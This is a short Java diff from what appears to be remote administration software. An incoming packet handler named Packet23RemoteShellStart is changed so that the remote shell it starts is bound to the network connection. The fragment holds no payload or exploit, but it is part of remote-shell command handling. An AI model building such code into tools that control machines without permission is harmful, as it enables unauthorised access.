@@ -7,7 +7,7 @@ public class Packet23RemoteShellStart extends AbstractIncomingPacket {
 
 	@Override
 	public void read(Connection con) throws Exception {
-		new RemoteShell().start();
+		new RemoteShell(con).start();
 	}
 
 }
